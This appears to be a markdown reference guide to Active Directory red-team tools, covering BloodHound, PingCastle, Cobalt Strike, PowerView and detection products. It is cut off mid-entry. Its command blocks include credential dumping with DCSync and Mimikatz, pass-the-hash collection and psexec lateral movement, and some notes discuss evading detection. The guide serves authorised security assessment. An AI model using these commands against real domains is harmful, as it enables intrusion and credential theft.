# <span style="color:rgb(255, 192, 0)">Commercial & Free/Open-Source AD Red Teaming Tools</span>

Complete reference of commercial (paid) and free/open-source tools for Active Directory security assessments. Grouped by category with installation, usage, and cost models.

---

## <span style="color:rgb(255, 0, 0)">Contents</span>

- [Tool Categories Legend](#tool-categories-legend)
- [Commercial Tools](#commercial-tools)
  - [AD Attack Path Mapping & Analysis](#ad-attack-path-mapping--analysis)
  - [AD Security Auditing & Hardening](#ad-security-auditing--hardening)
  - [Identity Protection & Detection](#identity-protection--detection)
  - [Audit & Compliance](#audit--compliance)
  - [PAM & Privileged Access](#pam--privileged-access)
  - [SIEM & UEBA](#siem--ueba)
  - [Commercial C2 & EDR Evasion](#commercial-c2--edr-evasion)
  - [Commercial Benchmark Tools](#commercial-benchmark-tools)
- [Open Source / Free Tools](#open-source--free-tools)
  - [Enumeration & Reconnaissance](#enumeration--reconnaissance)
  - [Credential Access & Theft](#credential-access--theft)
  - [Kerberos Abuse](#kerberos-abuse)
  - [ADCS Abuse](#adcs-abuse)
  - [Lateral Movement & Remote Execution](#lateral-movement--remote-execution)
  - [Privilege Escalation (Local)](#privilege-escalation-local)
  - [NTLM Relay & Coercion](#ntlm-relay--coercion)
  - [DNS & Network Discovery](#dns--network-discovery)
  - [Password Spraying & Brute Force](#password-spraying--brute-force)
  - [GPO & ACL Auditing](#gpo--acl-auditing)
  - [C2 Frameworks](#c2-frameworks)
  - [Tunneling & Pivoting](#tunneling--pivoting)
  - [Port Scanning & Discovery](#port-scanning--discovery)
  - [Cracking & Password Recovery](#cracking--password-recovery)
  - [EDR, Sysinternals & DFIR](#edr-sysinternals--dfir)
  - [Living Off the Land](#living-off-the-land)
  - [Vulnerability & Exploit Suggesters](#vulnerability--exploit-suggesters)
- [Quick Reference Tables](#quick-reference-tables)

---

## <span style="color:rgb(0, 176, 240)">Tool Categories Legend</span>

| Category | Code | Description |
|----------|------|-------------|
| Enumeration | ENUM | Domain/network reconnaissance, info gathering |
| Credential Access | CRED | Password/certificate/key extraction, theft |
| Lateral Movement | LAT | Remote execution, pivoting between hosts |
| Privilege Escalation | PE | Local or domain privilege escalation |
| Persistence | PERS | Backdoor, golden ticket, skeleton key |
| C2 | C2 | Command & control frameworks |
| Tunneling | TUN | Proxy, pivoting, traffic forwarding |
| Kerberos | KERB | Kerberos protocol abuse (roasting, delegation) |
| ADCS | ADCS | AD Certificate Services abuse |
| NTLM Relay | RELAY | NTLM authentication relay attacks |
| Coercion | COERCE | Forced authentication triggers |
| Password Spray | SPRAY | Password spraying, brute force |
| GPO/ACL | GPO | Group Policy / ACL auditing |
| DNS | DNS | DNS enumeration, zone transfer |
| Discovery | DISC | Port scanning, service discovery |
| Cracking | CRACK | Hash cracking (GPU/CPU) |
| DFIR | DFIR | Incident response, forensics |
| LOL | LOL | Living Off the Land binaries/scripts |

---

# <span style="color:rgb(0, 176, 240)">Commercial Tools</span>

---

## <span style="color:rgb(146, 208, 80)">AD Attack Path Mapping & Analysis</span>

---

### BloodHound Enterprise

| Property | Value |
|----------|-------|
| **Vendor** | SpecterOps |
| **Category** | ENUM, PE, PERS |
| **Platform** | Web (SaaS) + Windows/Linux collector |
| **Cost** | Paid (subscription, tiered pricing) |
| **Install** | Managed SaaS; collectors: SharpHound.exe, BloodHound.py, RustHound |
| **Repo** | https://github.com/SpecterOps/BloodHound |

**Description:** Enterprise version of BloodHound with continuous monitoring, historical tracking, risk-based prioritization, and team collaboration. Builds a graph of AD relationships to identify attack paths to Tier 0 assets.

**Key Features:**
- Continuous LDAP monitoring (not snapshot-based)
- Historical path tracking and trend analysis
- Risk scoring and remediation prioritization
- Tier 0 / Tier 1 asset tagging
- Azure AD / hybrid support
- Team collaboration with saved queries and notes
- API access for automation

**Red Team Use:**
- Continuous monitoring of attack paths during engagements
- Identify shortest path to Domain Admin across time
- Track effects of credential rotation on path viability
- Export attack paths for reporting

---

### Forest Druid (Semperis)

| Property | Value |
|----------|-------|
| **Vendor** | Semperis |
| **Category** | ENUM, PE |
| **Platform** | Windows |
| **Cost** | Free (limited) / Paid Enterprise |
| **Install** | Download from semperis.com |
| **Repo** | https://www.semperis.com/forest-druid/ |

**Description:** Tier 0 attack path analysis tool focused on identifying and visualizing paths to Tier 0 assets (Domain Admins, Enterprise Admins, DCs, CA servers, etc.).

**Key Features:**
- Tier 0 boundary identification
- Attack path visualization to Tier 0
- Exposure analysis and scoring
- Remediation guidance
- No agent required (read-only)

**Red Team Use:**
- Identify all possible Tier 0 attack paths
- Validate BloodHound findings
- Determine tier boundaries for reporting
- Prioritize high-value targets

---

### PingCastle (Netwrix)

| Property | Value |
|----------|-------|
| **Vendor** | Netwrix |
| **Category** | ENUM, GPO |
| **Platform** | Windows |
| **Cost** | Free Community Edition / Paid Enterprise |
| **Install** | Download from pingcastle.com; run directly (no install) |
| **Repo** | https://github.com/vletoux/pingcastle |

**Description:** AD security auditing tool that analyzes AD security posture and generates risk-based reports with Health Check, Global ACL, ADCS, Delegation, and Graph analysis modules.

**Key Features:**
- Health Check: 60+ security rules with risk scoring
- Global ACL: all AD ACLs analysis
- ADCS: certificate services vulnerability scan
- Delegation: delegation analysis
- Graph: trust relationship visualization
- Console and HTML report output
- Scorings: Defense in Depth, Security, Compliance

**Red Team Use:**
- Rapid AD security posture assessment
- Identify misconfigurations for exploitation
- Map delegation and ACL weaknesses
- Generate client-facing risk reports
- Identify Kerberos delegation abuse paths

**Key Commands:**
```powershell
# Health Check (most common)
PingCastle.exe --health-check --server dc01.domain.local --user domain\user --password pass

# Comprehensive assessment
PingCastle.exe --health-check --server dc01.domain.local --user domain\user --password pass --scorings All

# ADCS assessment
PingCastle.exe --adcs --server dc01.domain.local --user domain\user --password pass

# ACL analysis
PingCastle.exe --global-acl --server dc01.domain.local --user domain\user --password pass

# Graph analysis (trusts)
PingCastle.exe --graph --server dc01.domain.local

# Export to HTML
PingCastle.exe --health-check --export-html report.html
```

---

### Purple Knight (Semperis)

| Property | Value |
|----------|-------|
| **Vendor** | Semperis |
| **Category** | ENUM |
| **Platform** | Windows |
| **Cost** | Free |
| **Install** | Download from semperis.com |
| **Repo** | https://www.semperis.com/purple-knight/ |

**Description:** Free AD security assessment tool that evaluates AD environment against 100+ security indicators and provides a security posture score with remediation guidance.

**Key Features:**
- 100+ security indicators (built-in checks)
- Security posture score (0-100)
- Attack timeline visualization
- Prioritized remediation guidance
- No agent required, read-only access
- HTML + Excel reporting

**Red Team Use:**
- Free, non-invasive AD security assessment
- Identify low-hanging fruit misconfigurations
- Baseline security posture before exploitation
- Client reporting with clear score metrics

---

## <span style="color:rgb(146, 208, 80)">AD Security Auditing & Hardening</span>

---

### Semperis Directory Services Protector (DSP)

| Property | Value |
|----------|-------|
| **Vendor** | Semperis |
| **Category** | ENUM, DFIR |
| **Platform** | Windows, Web |
| **Cost** | Paid (subscription) |
| **Install** | Enterprise deployment (agents/collectors) |

**Description:** Enterprise AD protection platform providing real-time threat detection, incident response, and automated rollback for AD and Azure AD.

**Key Features:**
- Real-time AD change monitoring and detection
- Automated rollback of malicious changes
- Hybrid AD / Azure AD coverage
- Forensic analysis and attack timeline
- Backup & disaster recovery for AD
- No AD schema changes required

**Red Team Use:**
- Defenders use it; red team should understand detection coverage
- Test detection capabilities against techniques
- Identify AD changes that trigger alerts
- Understand rollback limitations

---

### CrowdStrike Falcon Identity Protection

| Property | Value |
|----------|-------|
| **Vendor** | CrowdStrike |
| **Category** | DFIR, ENUM |
| **Platform** | Cloud (SaaS) + Agent |
| **Cost** | Paid (subscription, per-endpoint) |
| **Install** | Deploy Falcon sensor + Identity module |

**Description:** Identity threat detection and response (ITDR) solution that monitors AD authentication, lateral movement, and credential abuse.

**Key Features:**
- Real-time detection of Kerberoasting, DCSync, Pass-the-Hash
- Identity behavior baselines and anomaly detection
- Integration with Falcon EDR
- Attack path visualization
- Automated response actions

**Red Team Use:**
- Understand detectable techniques to avoid
- Test detection latency and coverage
- Evaluate OPSEC requirements
- Plan evasion strategies (e.g., masking, timing)

---

### Microsoft Defender for Identity

| Property | Value |
|----------|-------|
| **Vendor** | Microsoft |
| **Category** | DFIR |
| **Platform** | Cloud (SaaS) + Sensor |
| **Cost** | Paid (EMS E5, standalone) |
| **Install** | Deploy sensor on DCs + AD FS |

**Description:** Cloud-based security solution that identifies, detects, and investigates advanced threats targeting AD using machine learning and behavioral analytics.

**Key Features:**
- Lateral movement detection (Pass-the-Hash/Ticket, Overpass-the-Hash)
- Reconnaissance detection (BloodHound, AD enumeration)
- DCSync detection
- Kerberos abuse detection (golden/silver tickets, Kerberoasting)
- Entity behavior analytics
- Integration with Microsoft Sentinel

**Red Team Use:**
- Critical to understand for OPSEC in Microsoft environments
- Canary accounts, Honeytoken detection awareness
- Timing analysis for lateral movement
- Known detection delays and bypasses

---

### Tenable Identity Exposure (formerly Alsid)

| Property | Value |
|----------|-------|
| **Vendor** | Tenable |
| **Category** | ENUM, DFIR |
| **Platform** | Windows + Web |
| **Cost** | Paid (subscription) |
| **Install** | Deploy Alsid sensor + Web console |

**Description:** AD security solution continuously monitoring AD for attack paths, misconfigurations, and suspicious activities. Original technology from Alsid (acquired by Tenable).

**Key Features:**
- Continuous AD attack path detection
- AD Certificate Services (ADCS) vulnerability scanning
- DACL analysis
- Suspicious activity detection
- Compliance reporting (ANSSI, CIS)
- Over 150 built-in security rules

**Red Team Use:**
- Understand detection rules for OPSEC
- Identify ADCS paths it detects
- Test against Alsid's DACL analysis

---

## <span style="color:rgb(146, 208, 80)">Audit & Compliance</span>

---

### Netwrix Auditor / StealthAUDIT

| Property | Value |
|----------|-------|
| **Vendor** | Netwrix |
| **Category** | ENUM, DFIR |
| **Platform** | Windows, Web |
| **Cost** | Paid (subscription) |
| **Install** | Enterprise deployment (collectors + central server) |

**Description:** Comprehensive AD change auditing and reporting platform. Tracks all AD, Group Policy, and Azure AD configuration changes with compliance reporting.

**Key Features:**
- AD and Azure AD change tracking
- Group Policy audit trail
- Compliance reports (SOX, HIPAA, PCI, GDPR)
- Real-time alerting on sensitive changes
- Privileged user activity monitoring
- Before/after comparison of changes

**Red Team Use:**
- Understand what changes are logged
- Identify auditing blind spots
- Plan OPSEC around monitored operations

---

### ManageEngine ADAudit Plus / AD360

| Property | Value |
|----------|-------|
| **Vendor** | Zoho / ManageEngine |
| **Category** | ENUM, DFIR |
| **Platform** | Windows, Web |
| **Cost** | Paid (subscription) |
| **Install** | Deploy on-prem or cloud |

**Description:** AD auditing and compliance solution providing real-time tracking of AD changes, logon/logoff activity, and privilege escalation attempts.

**Key Features:**
- Real-time AD change auditing
- Logon/logoff, account lockout tracking
- Compliance reports (SOX, HIPAA, PCI, FISMA)
- Pre-built threat detection rules
- User behavior analytics
- Azure AD and Exchange auditing

**Red Team Use:**
- Identify what AD changes trigger alerts
- Audit coverage mapping for OPSEC
- Test detection bypasses

---

### Quest Change Auditor

| Property | Value |
|----------|-------|
| **Vendor** | Quest Software |
| **Category** | ENUM, DFIR |
| **Platform** | Windows, Web |
| **Cost** | Paid (subscription) |
| **Install** | Agents on DCs + management console |

**Description:** Real-time AD auditing and threat detection solution monitoring all configuration changes, providing rollback capability and compliance reporting.

**Key Features:**
- Real-time change auditing
- Rollback/revert of unauthorized changes
- Threat detection alerts
- Compliance reporting
- Cross-platform coverage (AD, Azure AD, Exchange, File)

**Red Team Use:**
- Understand rollback detection for persistence
- Plan OPSEC around monitored attributes
- Identify high-risk operations

---

### Varonis DatAdvantage / DatAlert

| Property | Value |
|----------|-------|
| **Vendor** | Varonis |
| **Category** | ENUM, DFIR |
| **Platform** | Windows, Web |
| **Cost** | Paid (subscription) |
| **Install** | DatAdvantage server + agents |

**Description:** Data security and analytics platform that monitors AD, file shares, SharePoint, and email for suspicious access patterns, excessive permissions, and insider threats.

**Key Features:**
- AD permission analysis (who has access to what)
- File server share/NTFS permission auditing
- User behavior analytics (UEBA)
- Alerting on unusual access patterns
- Data classification and discovery
- Remediation automation

**Red Team Use:**
- Identify overly permissive shares for data access
- Understand detection of unusual file access
- Plan data exfiltration OPSEC

---

## <span style="color:rgb(146, 208, 80)">PAM & Privileged Access</span>

---

### CyberArk Privileged Access Security (PAS)

| Property | Value |
|----------|-------|
| **Vendor** | CyberArk |
| **Category** | PERS, DFIR |
| **Platform** | Windows, Web |
| **Cost** | Paid (subscription) |
| **Install** | Vault, CPM, PSM components |

**Description:** Enterprise privileged access management (PAM) solution: credential vaulting, session isolation, and least-privilege enforcement for AD service accounts and admins.

**Key Features:**
- Credential vaulting and rotation
- Session recording and isolation (PSM)
- Just-in-time (JIT) privileged access
- Application Identity Manager (AIM)
- Automatic password rotation
- Threat detection around privileged accounts

**Red Team Use:**
- Attack and bypass PAM controls (PSM session hijacking)
- Target CyberArk vault credential theft
- Understand credential rotation timing for persistence
- Plan OPSEC around rotated accounts

---

### Delinea (Thycotic) Secret Server / AD Bridge

| Property | Value |
|----------|-------|
| **Vendor** | Delinea (formerly Thycotic, Centrify) |
| **Category** | PERS |
| **Platform** | Windows, Web, Linux |
| **Cost** | Paid (subscription) |
| **Install** | Secret Server (Windows) + agents |

**Description:** PAM and privileged account management solution providing credential vaulting, session management, and AD bridge for Unix/Linux authentication.

**Key Features:**
- Credential vaulting and rotation
- Session recording and proxy
- Privileged task automation
- AD Bridge: Linux/Mac authentication via AD (formerly Centrify)
- Service account management
- Just-in-time access

**Red Team Use:**
- Target Secret Server API for credential extraction
- Credential rotation timing analysis for persistence
- AD Bridge misconfigurations (sudo, SSH keys)

---

### BeyondTrust PowerBroker / Retina

| Property | Value |
|----------|-------|
| **Vendor** | BeyondTrust |
| **Category** | PERS, PE |
| **Platform** | Windows, Linux, Web |
| **Cost** | Paid (subscription) |
| **Install** | PowerBroker agents + management console |

**Description:** Privileged access management including PowerBroker (least-privilege elevation) and Retina (vulnerability scanner). Manages AD privileged accounts, application control, and vulnerability assessment.

**Key Features:**
- PowerBroker: Windows least-privilege / application control
- PowerBroker Identity Services (PBIS): Linux AD auth
- BeyondInsight: analytics platform
- Retina: vulnerability scanning
- Privileged session management

**Red Team Use:**
- Identify PowerBroker policies that can be bypassed
- Target PBIS for Linux credential access
- Leverage over-privileged accounts in Retina

---

### CipherTrust (Dell / Thales)

| Property | Value |
|----------|-------|
| **Vendor** | Thales (formerly Dell Data Security) |
| **Category** | PERS |
| **Platform** | Windows, Linux |
| **Cost** | Paid (subscription) |
| **Install** | CipherTrust Manager + Key Agents |

**Description:** Enterprise encryption and key management platform integrating with AD for certificate lifecycle management, file encryption, and database encryption key protection.

**Key Features:**
- AD-integrated PKI and certificate lifecycle management
- Transparent file encryption
- Database encryption
- Key management and HSM integration
- Centrally managed encryption policies

**Red Team Use:**
- Target encryption key stores in AD
- Certificate authority abuse paths
- Identify unencrypted fallback channels

---

## <span style="color:rgb(146, 208, 80)">SIEM & UEBA</span>

---

### Splunk User Behavior Analytics (UBA)

| Property | Value |
|----------|-------|
| **Vendor** | Splunk |
| **Category** | DFIR |
| **Platform** | Linux, Web |
| **Cost** | Paid (subscription) |
| **Install** | UBA server + data sources (Splunk) |

**Description:** UEBA solution using machine learning to detect advanced threats in AD including lateral movement, privilege escalation, and credential abuse.

**Key Features:**
- ML-based anomaly detection
- AD authentication analysis
- Lateral movement detection
- Privilege escalation detection
- Integration with Splunk ES
- Risk-based alerting

**Red Team Use:**
- Understand ML model detection thresholds
- Noise injection to evade detection
- Timing and traffic pattern OPSEC

---

### Rapid7 InsightIDR

| Property | Value |
|----------|-------|
| **Vendor** | Rapid7 |
| **Category** | DFIR |
| **Platform** | Cloud (SaaS) + Collector |
| **Cost** | Paid (subscription) |
| **Install** | Insight agent + network collector |

**Description:** Cloud-native SIEM and UEBA with AD-focused threat detection rules, user behavior analytics, and automated incident response.

**Key Features:**
- AD authentication monitoring
- Threat detection rules (Kerberoasting, DCSync, brute force)
- User entity behavior analytics
- Automated response workflows
- Network traffic analysis

**Red Team Use:**
- Map detection coverage for AD attacks
- Identify behavioral baselines
- Plan OPSEC for authentication events

---

### RSA NetWitness

| Property | Value |
|----------|-------|
| **Vendor** | RSA (Dell/EMC) |
| **Category** | DFIR |
| **Platform** | Linux, Web |
| **Cost** | Paid (subscription) |
| **Install** | NetWitness Platform + Log Collectors, Packet Decoders |

**Description:** Enterprise SIEM and network forensics platform with AD-specific monitoring, log analysis, packet inspection, and user behavior analytics.

**Key Features:**
- Full packet capture and analysis
- Log management and correlation
- User behavior analytics
- Endpoint monitoring
- Threat intelligence integration
- Incident investigation workflow

**Red Team Use:**
- Packet capture awareness for network-based attacks
- Log source identification
- Understand endpoint detection coverage

---

### LogRhythm

| Property | Value |
|----------|-------|
| **Vendor** | LogRhythm |
| **Category** | DFIR |
| **Platform** | Windows, Linux, Web |
| **Cost** | Paid (subscription) |
| **Install** | AI Engine + Data Processors + Agents |

**Description:** SIEM platform with AD-specific threat detection, log management, and automated response workflows for identity-based attacks.

**Key Features:**
- AD-specific threat intelligence feeds
- AI Engine for behavioral analytics
- Automated investigation workflows
- Compliance reporting
- Endpoint threat detection

**Red Team Use:**
- Understand monitoring coverage
- Test detection rule triggers
- Plan OPSEC for AD operations

---

### Securonix

| Property | Value |
|----------|-------|
| **Vendor** | Securonix |
| **Category** | DFIR |
| **Platform** | Cloud (SaaS) |
| **Cost** | Paid (subscription) |
| **Install** | Cloud-deployed collectors |

**Description:** Cloud-native SIEM and UEBA platform with behavioral analytics for AD, cloud identity, and data access. Uses machine learning to detect advanced persistent threats.

**Key Features:**
- Behavioral analytics with ML
- AD threat detection content
- Identity analytics
- Cloud and hybrid identity coverage
- Automated response
- Threat hunting interface

**Red Team Use:**
- Understand ML-based detection approaches
- Plan OPSEC for identity-based operations
- Map analytics coverage

---

## <span style="color:rgb(146, 208, 80)">Commercial C2 & EDR Evasion</span>

---

### Cobalt Strike

| Property | Value |
|----------|-------|
| **Vendor** | Fortra (formerly Strategic Cyber) |
| **Category** | C2, LAT, PE |
| **Platform** | Windows (client), Linux/Windows (team server) |
| **Cost** | Paid (per-license, annual) |
| **Install** | Java team server + Windows client |
| **Repo** | https://www.cobaltstrike.com |

**Description:** Commercial adversary simulation software. Full-featured C2 framework with advanced post-exploitation, Malleable C2, SOCKS proxying, and extensive AD attack toolkit.

**Key Features:**
- Beacon payloads (HTTP/HTTPS/DNS/SMB/TCP)
- Malleable C2 (customizable traffic profiles)
- Artifact Kit (custom payload generation)
- SOCKS proxy and reverse port forwarding
- AD attack tools (Kerberoasting, DCSync, Pass-the-Hash)
- Execute-Assembly (run .NET in-memory)
- BOF (Beacon Object Files)
- Aggressor Script (extensible scripting)
- Mimikatz integration
- Logging and reporting

**Red Team Use:**
- Primary C2 for professional red teams
- AD exploitation via Beacon's built-in commands
- Kerberos ticket manipulation
- Lateral movement via SMB, WinRM, WMI
- Domain dominance and persistence

**Key Commands:**
```
beacon> dcsync domain.local domain\krbtgt
beacon> kerberos_ticket_use /path/ticket.kirbi
beacon> mimikatz sekurlsa::logonpasswords
beacon> make_token domain\user password
beacon> remote-exec wmi target cmd /c whoami
beacon> execute-assembly /path/SharpHound.exe -c All
beacon> beacon jump psexec target listener
```

---

### Brute Ratel

| Property | Value |
|----------|-------|
| **Vendor** | Dark Vortex |
| **Category** | C2, LAT |
| **Platform** | Windows (client), Linux/Windows (server) |
| **Cost** | Paid (invite-only, per-license) |
| **Install** | Server binary + client |
| **Repo** | https://bruteratel.com |

**Description:** Advanced adversary simulation and red team C2 platform designed for EDR/AV evasion with unique execution techniques and deep Windows internals focus.

**Key Features:**
- Badger (beacon) with multiple transport
- EDR evasion via direct syscalls and API unhooking
- NtCreateThreadEx-less execution
- Reflective DLL loading and shellcode injection
- Built-in AD tools
- SOCKS proxy
- Custom C2 profile

**Red Team Use:**
- Highly evasive C2 for mature environments
- AD attack execution with minimal detection
- EDR avoidance for credential access

---

### Nighthawk (MDSec)

| Property | Value |
|----------|-------|
| **Vendor** | MDSec |
| **Category** | C2, LAT |
| **Platform** | Windows (client), Linux/Windows (server) |
| **Cost** | Paid (invite/application only) |
| **Install** | Team server + client |
| **Repo** | https://www.mdsec.co.uk/nighthawk/ |

**Description:** Premium C2 platform with focus on evasive operations, advanced tradecraft, and minimal footprint. Built by MDSec consultants.

**Key Features:**
- Sleep obfuscation and in-memory evasion
- Direct syscall execution
- Custom encryption and protocol
- Build system for payload customization
- Advanced code injection
- AD tools integration
- Anti-forensics capabilities

**Red Team Use:**
- Maximum OPSEC for high-value targets
- Evade modern EDR/AV with custom tradecraft
- Long-term persistence and C2

---

## <span style="color:rgb(146, 208, 80)">Commercial Benchmark Tools</span>

---

### AD-Bench (AD Benchmark Tools)

| Property | Value |
|----------|-------|
| **Vendor** | Various |
| **Category** | ENUM |
| **Platform** | Windows |
| **Cost** | Free / Commercial variants |
| **Install** | Download script/suite |
| **Repo** | https://github.com/ad-bench/ad-bench |

**Description:** AD security benchmarking tool suite that assesses AD environment against industry standards (CIS, NIST) and generates compliance reports.

**Key Features:**
- CIS benchmarks for AD
- Automated security assessment
- Compliance scoring
- Remediation guidance
- Report generation (HTML, XLSX)

**Red Team Use:**
- Identify misconfigurations for exploitation
- Compare findings against benchmarks
- Generate compliance-gap reports for clients

---

# <span style="color:rgb(255, 0, 0)">Open Source / Free Tools</span>

---

## <span style="color:rgb(146, 208, 80)">Enumeration & Reconnaissance</span>

---

### BloodHound CE (Community Edition)

| Property | Value |
|----------|-------|
| **Vendor** | SpecterOps (community) |
| **Category** | ENUM, PE |
| **Platform** | Linux, Windows (via Docker) |
| **Cost** | Free (open source) |
| **Install** | `docker run`, npm, or pre-built |
| **Repo** | https://github.com/SpecterOps/BloodHound |

**Description:** Open-source AD attack path mapping tool using graph theory. Ingest collected data via SharpHound/BloodHound.py and visualize attack paths through an interactive Neo4j graph.

**Key Features:**
- Interactive graph visualization
- Attack path queries (shortest path, reachable high-value)
- Custom Cypher queries
- Session and ACL analysis
- Kerberos delegation analysis
- GPO relationships
- ADCS attack paths (ESC1-ESC13)
- Azure attack paths (CE partial)

**Red Team Use:**
- Primary AD enumeration and attack path mapping
- Domain privilege escalation path identification
- Session collection for lateral movement
- ACL abuse path discovery

**Install:**
```bash
# Docker (easiest)
docker run -it -p 7474:7474 -p 7687:7687 specterops/bloodhound:latest

# Standalone - download pre-built binary from GitHub releases
chmod +x BloodHound-linux-x64
./BloodHound-linux-x64
```

---

### SharpHound (BloodHound CE Collector)

| Property | Value |
|----------|-------|
| **Vendor** | SpecterOps |
| **Category** | ENUM |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download binary from GitHub releases; or compile |
| **Repo** | https://github.com/SpecterOps/SharpHound |

**Description:** Official Windows data collector for BloodHound CE. C# binary that enumerates AD objects, sessions, ACLs, and group memberships.

**Key Features:**
- Collection methods: Group, Session, ACL, ObjectProps, DCOM, RDP, PSRemote, Container, GPOLocalGroup, ADCS, etc.
- LDAP and SMB-based collection
- Stealth mode (DCOnly)
- Loop/continuous collection
- Cache support for large domains

**Red Team Use:**
- Deploy via C2 or execute from compromised host
- Collect all AD data for BloodHound analysis
- Schedule loop collection for session data

**Key Commands:**
```powershell
# Full collection
SharpHound.exe -c All -d domain.local

# Stealth (only LDAP queries, no SMB sessions)
SharpHound.exe -c DCOnly --Stealth

# Loop collection for sessions
SharpHound.exe -c Session --Loop --LoopInterval 00:10:00

# Specify DC
SharpHound.exe -c All -d domain.local --DomainController dc01.domain.local
```

---

### BloodHound.py

| Property | Value |
|----------|-------|
| **Vendor** | Dirk-jan Molma |
| **Category** | ENUM |
| **Platform** | Linux, Windows, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install bloodhound-py` |
| **Repo** | https://github.com/dirkjanm/BloodHound.py |

**Description:** Python implementation of SharpHound for Linux-based BloodHound data collection. Uses LDAP queries to collect AD data.

**Key Features:**
- All BloodHound collection methods
- LDAP-based (no SMB required)
- Kerberos and NTLM auth
- ZIP file output
- DCOnly mode

**Red Team Use:**
- Collect from Linux attack host without dropping binaries
- Use with proxychains for pivoted collection
- Automated collection in scripts

**Key Commands:**
```bash
# Basic collection
bloodhound-python -u user -p pass -d domain.local -dc dc01.domain.local -c All

# DCOnly
bloodhound-python -u user -p pass -d domain.local -c DCOnly

# With NTLM hash
bloodhound-python -u user -H :NTLM -d domain.local -c All
```

---

### RustHound

| Property | Value |
|----------|-------|
| **Vendor** | Opgenus |
| **Category** | ENUM |
| **Platform** | Linux, Windows, macOS |
| **Cost** | Free (open source) |
| **Install** | `cargo install rusthound` or download binary |
| **Repo** | https://github.com/OPENCYBER-FR/RustHound |

**Description:** Rust-based BloodHound data collector with LDAP protocol support. Faster than Python version, single binary with no dependencies.

**Key Features:**
- Multi-threaded LDAP queries
- Cross-platform (Linux, Windows, macOS)
- Faster than BloodHound.py
- All collection methods
- JSON/JSONL output

**Red Team Use:**
- Fast collection from Linux hosts
- Statically-linked binary for constrained targets
- Pivoted collection via proxychains

**Key Commands:**
```bash
# Basic collection
RustHound -u user -p pass -d domain.local -c All

# DCOnly
RustHound -u user -p pass -d domain.local -c DCOnly
```

---

### AD Module (PowerShell)

| Property | Value |
|----------|-------|
| **Vendor** | Microsoft |
| **Category** | ENUM |
| **Platform** | Windows |
| **Cost** | Free (RSAT feature) |
| **Install** | `Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools... -Online` |
| **Repo** | N/A (built-in Windows) |

**Description:** Official Microsoft PowerShell module for Active Directory management and querying. Part of RSAT (Remote Server Administration Tools).

**Key Features:**
- Full AD object querying (users, groups, computers, OUs)
- Group membership retrieval
- ACL/GP enumeration
- Domain and forest trust view
- Password policy retrieval
- Object creation/modification (if privileges)

**Red Team Use:**
- "Safe" enumeration that blends with admin traffic
- Also available on DCs without extra install
- Scripting for automated recon

**Key Commands:**
```powershell
# Enumerate users
Get-ADUser -Filter * -Properties *

# Enumerate groups
Get-ADGroup -Filter * -Properties *

# Domain admins members
Get-ADGroupMember -Identity "Domain Admins"

# Password policy
Get-ADDefaultDomainPasswordPolicy

# Trust relationships
Get-ADTrust -Filter *

# Computers
Get-ADComputer -Filter * -Properties *

# OUs
Get-ADOrganizationalUnit -Filter *

# Service accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

---

### PowerView / SharpView

| Property | Value |
|----------|-------|
| **Vendor** | Will Schroeder (@harmj0y) |
| **Category** | ENUM, PE |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | `Import-Module PowerView.ps1` / download SharpView.exe |
| **Repo** | https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon |

**Description:** Part of PowerSploit. Comprehensive PowerShell/C# AD reconnaissance tool set. De facto standard for manual AD enumeration.

**Key Features:**
- User, group, computer, OU enumeration
- ACL/ACE enumeration
- GPO enumeration
- Session enumeration
- User hunting (find where admins are logged in)
- Kerberoasting (Get-NetUser with SPN)
- Domain trust mapping
- Share enumeration

**Red Team Use:**
- Manual AD recon beyond BloodHound
- ACL auditing and abuse
- User hunting for lateral movement
- Scripting custom recon

**Key Commands:**
```powershell
# Domain info
Get-NetDomain

# Users
Get-NetUser | Select-Object samaccountname, description, pwdlastset, memberof

# Domain admins
Get-NetGroupMember "Domain Admins"

# User hunting
Find-UserLocation -UserList users.txt

# ACLs
Get-ObjectAcl -Identity "Administrator"

# Sessions on computer
Get-NetSession -ComputerName target

# Shares
Find-InterestingFile -Path \\target\share$ -Include "*.xls" -LastAccessTime 30

# SPN users (kerberoasting)
Get-NetUser -SPN

# GPO
Get-NetGPO | Select-Object displayname, gpcfilesyspath
```

---

### ADRecon

| Property | Value |
|----------|-------|
| **Vendor** | Sense of Security |
| **Category** | ENUM |
| **Platform** | Windows |
| **Cost** | Free (open source) |
| **Install** | Download .ps1 from GitHub |
| **Repo** | https://github.com/sense-of-security/ADRecon |

**Description:** PowerShell-based AD reconnaissance tool that generates comprehensive Excel/HTML/CSV reports covering users, groups, computers, ACLs, GPOs, trusts, and more.

**Key Features:**
- All AD objects exported to organized reports
- ACL analysis and delegation report
- Password policy audit
- Last logon analysis
- Privileged group membership
- Trust relationship mapping
- GPO summary
- Service account identification

**Red Team Use:**
- One-shot comprehensive AD dump
- Reporting for client deliverables
- Alternative to BloodHound for quick assessments

**Key Commands:**
```powershell
# Full recon
Invoke-ADRecon -Collect All -GenerateHTML

# With specific DC
Invoke-ADRecon -DomainController dc01.domain.local -Credential domain\user

# Specific collectors
Invoke-ADRecon -Collect Users,Groups,Computers,Trusts
```

---

### ldapdomaindump

| Property | Value |
|----------|-------|
| **Vendor** | Dirk-jan Molma |
| **Category** | ENUM |
| **Platform** | Linux, macOS |
| **Cost** | Free (open source) |
| **Install** | `pip install ldapdomaindump` |
| **Repo** | https://github.com/dirkjanm/ldapdomaindump |

**Description:** Python tool that dumps AD information via LDAP to human-readable HTML, JSON, and CSV files for quick domain recon.

**Key Features:**
- Outputs users, groups, computers, trusts, policy to HTML/JSON
- No BloodHound dependency
- Quick visual domain overview
- LDAPS support

**Red Team Use:**
- Quick initial AD recon
- Share results with team via HTML
- Feed JSON data into other tools

**Key Commands:**
```bash
# Basic dump
ldapdomaindump -u domain\user -p pass 10.0.0.1 -o ldap_dump/

# With hash
ldapdomaindump -u domain\user -H :NTLM 10.0.0.1 -o ldap_dump/
```

---

### enum4linux / enum4linux-ng

| Property | Value |
|----------|-------|
| **Vendor** | Mark Lowe (original), CSC (ng) |
| **Category** | ENUM |
| **Platform** | Linux |
| **Cost** | Free (open source) |
| **Install** | `apt install enum4linux-ng` / `pip install enum4linux-ng` |
| **Repo** | https://github.com/cddmp/enum4linux-ng |

